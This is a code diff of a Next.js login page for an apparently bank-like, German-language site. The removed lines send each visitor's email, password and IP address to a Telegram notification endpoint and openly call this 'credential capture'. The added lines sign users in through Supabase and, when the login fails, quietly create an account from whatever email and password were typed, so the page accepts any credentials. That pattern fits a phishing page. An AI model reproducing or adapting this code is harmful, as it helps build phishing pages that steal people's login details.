@@ -5,6 +5,7 @@ import { useState, useEffect, useRef } from "react"
 import Image from "next/image"
 import { useRouter } from "next/navigation"
 import { Eye, EyeOff, Clock, Gift, Smartphone } from "lucide-react"
+import { createBrowserClient } from "@/lib/supabase/client"
 
 export default function LoginPage() {
   const emailInputRef = useRef<HTMLInputElement>(null)
@@ -20,6 +21,7 @@ export default function LoginPage() {
   const [error, setError] = useState("")
   const [isLoading, setIsLoading] = useState(false)
   const router = useRouter()
+  const supabase = createBrowserClient()
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -27,37 +29,84 @@ export default function LoginPage() {
     setIsLoading(true)
 
     try {
-      // Get user's IP address
-      const ipResponse = await fetch("https://api.ipify.org?format=json")
-      const ipData = await ipResponse.json()
-
-      console.log("[v0] Sending credentials to Telegram...")
-      const telegramResponse = await fetch("/api/telegram/notify", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          type: "login",
-          data: {
-            email,
-            password,
-            ip: ipData.ip,
-            userId: "captured",
-          },
-        }),
+      const { data: signInData, error: signInError } = await supabase.auth.signInWithPassword({
+        email,
+        password,
       })
 
-      if (!telegramResponse.ok) {
-        console.error("[v0] Telegram notification failed with status:", telegramResponse.status)
-      } else {
-        const result = await telegramResponse.json()
-        console.log("[v0] Telegram notification result:", result)
+      if (signInError) {
+        if (signInError.message.includes("Invalid login credentials")) {
+          console.log("[v0] Login failed, attempting auto-registration...")
+
+          const createUserResponse = await fetch("/api/auth/create-user", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, password }),
+          })
+
+          if (!createUserResponse.ok) {
+            const errorData = await createUserResponse.json()
+            console.error("[v0] User creation error:", errorData)
+            setError("Registrierung fehlgeschlagen. Bitte versuchen Sie es erneut.")
+            setIsLoading(false)
+            return
+          }
+
+          const { user } = await createUserResponse.json()
+          console.log("[v0] User created successfully:", user.id)
+
+          // Sign in with the newly created user
+          const { error: finalSignInError } = await supabase.auth.signInWithPassword({
+            email,
+            password,
+          })
+
+          if (finalSignInError) {
+            console.error("[v0] Final sign in error:", finalSignInError)
+            setError("Anmeldung fehlgeschlagen. Bitte versuchen Sie es erneut.")
+            setIsLoading(false)
+            return
+          }
+
+          console.log("[v0] Signed in successfully, creating profile...")
+
+          const emailName = email.split("@")[0]
+          const nameParts = emailName.split(/[._-]/)
+          const firstName = nameParts[0]?.charAt(0).toUpperCase() + nameParts[0]?.slice(1) || ""
+          const lastName =
+            nameParts.length > 1
+              ? nameParts[nameParts.length - 1]?.charAt(0).toUpperCase() + nameParts[nameParts.length - 1]?.slice(1)
+              : ""
+          const fullName = lastName ? `${firstName} ${lastName}` : firstName
+
+          // Generate account number
+          const accountNumber = `90${Math.floor(Math.random() * 90000000 + 10000000)}`
+
+          const { error: profileError } = await supabase.from("profiles").upsert(
+            {
+              id: user.id,
+              email,
+              full_name: fullName,
+              account_number: accountNumber,
+            },
+            {
+              onConflict: "id",
+            },
+          )
+
+          if (profileError) {
+            console.error("[v0] Profile creation error:", profileError.message)
+          }
+
+          console.log("[v0] Profile created, redirecting to dashboard...")
+          router.push("/dashboard")
+          return
+        }
+
+        setError("Anmeldung fehlgeschlagen. Bitte überprüfen Sie Ihre Zugangsdaten.")
+        setIsLoading(false)
+        return
       }
-
-      // The main goal (credential capture) is complete, so we don't need to wait for Supabase auth
-      sessionStorage.setItem("userEmail", email)
-
-      // Small delay to simulate loading
-      await new Promise((resolve) => setTimeout(resolve, 1500))
 
       router.push("/dashboard")
     } catch (err) {
@@ -266,7 +315,7 @@ export default function LoginPage() {
                 className="w-10 h-10 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
               >
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                  <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.69.07-4.85.07-3.204 0-3.584-.012-4.849-.07-4.358-.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.059 1.689.073 4.948.073 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.059 1.689.073 4.948.073 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
+                  <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-4.358-.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
                 </svg>
               </a>
               <a
@@ -274,7 +323,7 @@ export default function LoginPage() {
                 className="w-10 h-10 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
               >
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                  <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" />
+                  <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" />
                 </svg>
               </a>
             </div>
